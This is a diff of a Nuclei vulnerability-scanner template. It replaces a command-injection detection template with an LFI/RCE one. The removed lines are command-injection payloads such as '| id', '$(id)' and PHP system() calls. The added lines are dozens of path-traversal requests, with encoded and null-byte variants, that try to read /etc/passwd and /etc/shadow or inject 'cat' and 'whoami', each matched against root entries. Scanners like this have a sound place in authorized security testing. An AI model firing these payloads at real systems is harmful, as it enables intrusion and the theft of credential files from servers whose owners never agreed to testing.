@@ -1,56 +1,70 @@
-id: RCE
-
-# Usage: 
-# echo "http://testphp.vulnweb.com/listproducts.php?cat=" | nuclei -t rce.yaml | awk '{print $6}'
+id: LFI-RCE
 
 info:
-  name: Remote Code Execution (RCE) Detection
-  author: 25
-  severity: high
-  tags: rce
+  name: LFI Detection
+  author: 0x240x23elu & payloadallthings
+  severity: High
 
 requests:
   - method: GET
+
     path:
-      - "{{BaseURL}}"
-
-    payloads:
-      injection:
-        - '| id'
-        - '; id'
-        - '&& id'
-        - '|| id'
-        - '$(id)'
-        - '`id`'
-        - '; system("id")'
-        - '; system("/usr/bin/id")'
-        - ';id;'
-        - '|id|'
-        - '|/usr/bin/id|'
-        - '||/usr/bin/id|'
-        - '%0Aid%0A'
-        - '%0A/usr/bin/id%0A'
-        - 'a);id'
-        - 'a);/usr/bin/id'
-        - 'a|id'
-        - 'a|/usr/bin/id'
-        - 'a;id'
-        - 'a;/usr/bin/id'
-        - '<?php system("id");?>'
-        - '"%2B`id`%2B"'
-        - '".system(%27id%27); $dummy="'
-
-    fuzzing:
-      - part: query
-        type: replace
-        mode: single
-        fuzz:
-          - "{{injection}}"
-
-    stop-at-first-match: true
-    matchers-condition: or
+      - "{{BaseURL}}../../../../etc/passwd"
+      - "{{BaseURL}}../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}../../../../../../../../etc/passwd"
+      - "{{BaseURL}}../../../../../../../etc/passwd"
+      - "{{BaseURL}}../../../../../../etc/passwd"
+      - "{{BaseURL}}../../../../../etc/passwd"
+      - "{{BaseURL}}../../../../etc/passwd"
+      - "{{BaseURL}}..;/../../../../../../../../etc/passwd"
+      - "{{BaseURL}}..;/../../../../../../../etc/passwd"
+      - "{{BaseURL}}..;/../../../../../../etc/passwd"
+      - "{{BaseURL}}..;/../../../../../etc/passwd"
+      - "{{BaseURL}}..;/../../../../etc/passwd"
+      - "{{BaseURL}}..;/../../../etc/passwd"
+      - "{{BaseURL}}..;/../../etc/passwd"
+      - "{{BaseURL}}..;/../../etc/passwd"
+      - "{{BaseURL}}../../../../../../../../../../../../etc/passwd%00"
+      - "{{BaseURL}}../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}../../../../../../../../../../../../etc/shadow%00"
+      - "{{BaseURL}}../../../../../../../../../../../../etc/shadow"
+      - "{{BaseURL}}/../../../../../../../../../../etc/passwd^^"
+      - "{{BaseURL}}/../../../../../../../../../../etc/shadow^^"
+      - "{{BaseURL}}/../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/../../../../../../../../../../etc/shadow"
+      - "{{BaseURL}}/./././././././././././etc/passwd"
+      - "{{BaseURL}}/./././././././././././etc/shadow"
+      - "{{BaseURL}}%0a/bin/cat%20/etc/passwd"
+      - "{{BaseURL}}%0a/bin/cat%20/etc/shadow"
+      - "{{BaseURL}}%00/etc/passwd%00"
+      - "{{BaseURL}}%00/etc/shadow%00"
+      - "{{BaseURL}}%00../../../../../../etc/passwd"
+      - "{{BaseURL}}%00../../../../../../etc/shadow"
+      - "{{BaseURL}}/../../../../../../../../../../../etc/passwd%00.jpg"
+      - "{{BaseURL}}/../../../../../../../../../../../etc/passwd%00.html"
+      - "{{BaseURL}}/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd"
+      - "{{BaseURL}}/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow"
+      - "{{BaseURL}}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+      - "{{BaseURL}}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow"
+      - "{{BaseURL}}%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00"
+      - "{{BaseURL}}/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00"
+      - "{{BaseURL}}%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%"
+      - "{{BaseURL}}\\&apos;/bin/cat%20/etc/passwd\\&apos;"
+      - "{{BaseURL}}\\&apos;/bin/cat%20/etc/shadow\\&apos;"
+      - "{{BaseURL}}cat+ ../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}cat+ ../../../../../../../../etc/passwd"
+      - "{{BaseURL}}cat+ ../../../../../../../etc/passwd"
+      - "{{BaseURL}}cat+ ../../../../../../etc/passwd"
+      - "{{BaseURL}}cat+ ../../../../../etc/passwd"
+      - "{{BaseURL}}cat+ ../../../../etc/passwd"
+      - "{{BaseURL}}whoami"
+      - "{{BaseURL}}cat ../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}cat ../../../../../../../../etc/passwd"
+      - "{{BaseURL}}cat ../../../../../../../etc/passwd"
+      - "{{BaseURL}}cat ../../../../../../etc/passwd"
+      - "{{BaseURL}}cat ../../../../../etc/passwd"
     matchers:
       - type: regex
-        part: body
         regex:
-          - 'uid=[0-9a-zA-Z_()-. ]+gid=[0-9a-zA-Z_()-. ]+'
+          - "root:[x*]:0:0:"
+        part: body
